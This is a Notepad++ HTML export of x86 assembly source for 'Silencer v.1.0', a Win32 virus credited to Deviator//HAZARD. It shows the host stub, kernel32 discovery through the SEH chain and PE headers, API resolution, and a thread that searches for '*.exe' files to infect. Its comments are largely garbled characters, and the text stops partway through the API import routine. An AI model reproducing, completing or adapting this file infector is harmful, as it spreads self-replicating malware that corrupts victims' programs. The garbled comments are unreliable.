<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Silencer v.1.0</span><span class="sc0">
</span><span class="sc1">; Using DME v.002b</span><span class="sc0">

</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc5">Msg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Test complete.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Host</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">
</span><span class="sc5">VEntry</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetEbp</span><span class="sc0">
</span><span class="sc5">GetEbp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VEntry</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">OldHost</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">InitApi</span><span class="sc0"> 

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">InfectDir</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">Tid</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">CreateThread</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">128000</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc1">;   Call    InfectDir</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">jquit</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OldHost</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Host</span><span class="sc0">

</span><span class="sc5">Tid</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">stuff.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">api.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">infect.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">DME.inc</span><span class="sc0">

</span><span class="sc5">VTbl</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VEntry</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">InfectDir</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">     </span><span class="sc5">dme.tbl</span><span class="sc0">
</span><span class="sc5">VTbll</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">VTbl</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">VLen</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">virdata.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">data.inc</span><span class="sc0">
</span><span class="sc5">FLen</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">buff</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">FLen</span><span class="sc4">-</span><span class="sc5">VEntry</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32.inc</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">VEntry</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">stuff.inc</span><span class="sc0"> </span><span class="sc4">]----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">InitApi</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">ApiInit</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">nf1</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">CreateFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ?ÿ§ð-ÿ?¿ ð¿ôR ¢ð R÷ÿ¢¬</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">imnum</span><span class="sc0">           </span><span class="sc1">; -£³-«? -ÿ¿ ¤£-ò¦ðð</span><span class="sc0">
</span><span class="sc9">Import</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">f0</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">f0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ?ÿ¡§ð¢ÿ?¿ ý&lt;ð-£</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">ImportApi</span><span class="sc0">           </span><span class="sc1">; ?¿ôR ¢ð £?¿</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">jquit</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc9">Import</span><span class="sc0">              </span><span class="sc1">; ? RýR&lt;³ÿ?¿</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InitApi</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">nf1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; ?¿ôR ¢</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CreateThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'ExitThread'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">InfectDir</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">fmask</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">VirFindData</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FindFirstFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; ?©?¿ ¤ÿc&lt;</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">AllFounded</span><span class="sc0">          </span><span class="sc1">; ??¢£ öR&lt;¬¨?...</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fhandle</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">ifile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">cFileName</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">InfectFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">fhandle</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">VirFindData</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FindNextFile</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; '&lt;?ý£®©ðc ¤ÿc&lt;</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ifile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">fhandle</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FindClose</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">AllFounded</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ExitThread</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; Needed !!</span><span class="sc0">
</span><span class="sc5">InfectDir</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">fhandle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">fmask</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc4">--[</span><span class="sc0"> </span><span class="sc5">api.inc</span><span class="sc0"> </span><span class="sc4">]------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; ??¡òR&lt;¬òR ô R¦?ý£  ôRð¡òÿ/ð¿ôR ¢ÿ kernel32 ô R¦?ý£ </span><span class="sc0">
</span><span class="sc1">; Deviator//HAZARD</span><span class="sc0">

</span><span class="sc5">k32</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">k32i</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">k32e</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">k32n</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">k32nn</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">obase</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">opos</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xpos</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ApiInit</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; SEH</span><span class="sc0">
</span><span class="sc5">findl</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; ?R¡&lt;?ý-ðc ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">last</span><span class="sc0">                </span><span class="sc1">; "?£</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">findl</span><span class="sc0">
</span><span class="sc5">last</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">fn</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">             </span><span class="sc1">; ?©?¿ MZ</span><span class="sc0">
</span><span class="sc5">fndk</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">mz</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fndk</span><span class="sc0">
</span><span class="sc5">mz</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">][</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; ?? ?¿ ¡¿?©-ð? -ÿ PE header</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3000h</span><span class="sc0">           </span><span class="sc1">; &gt; 3000h ? (ô R¡¢R ÷ Win95</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">fn</span><span class="sc0">              </span><span class="sc1">; MZ ÷¡¢ ?§ÿ?¢¡¯ ÷ ¡ÿ¿R¿</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; kernel32,ÿ ¿-? Rö&lt;R¿ SEH </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">        </span><span class="sc1">; ®ÿ¢¬ ý&lt;¯ ô ?ýR¢÷ ÿ©?-ð¯</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fn</span><span class="sc0">              </span><span class="sc1">; R¨ðöRò )</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">k32</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">          </span><span class="sc1">; Store Kernel32 ImageBase</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">][</span><span class="sc2">54h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">k32i</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; Store Kernel32 VA</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">][</span><span class="sc2">78h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">k32e</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; Store Kernel32 Export table</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">][</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Ordinal Base</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">obase</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">][</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Ordinal RVA</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">opos</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">][</span><span class="sc2">1Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">xpos</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; Export table</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">][</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">k32n</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; Export names</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">][</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">k32nn</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; Number of export names</span><span class="sc0">

    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ApiInit</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">ImportApi</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">            </span><span class="sc1">; EDi - import name,EDX - Len of name</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">k32n</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ? R¦?ý£ òÿ ð¿ôR ¢ÿ -£³-Rc ¤£-ò¦ðð</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">k32nn</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; ÷R÷ ÿ©ÿ?¢ ÷ EAX &lt;ðöR 0,?¡&lt;ð</span><span class="sc0">
</span><span class="sc5">aFindIt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">               </span><span class="sc1">; -?¢ ¢ÿòRc ¤£-ò¦ðð ÷ ­ò¡ôR ¢?</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">; ð&lt;ð ?? ÿý ?¡.</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">k32</span><span class="sc4">][</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">ItsIt</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
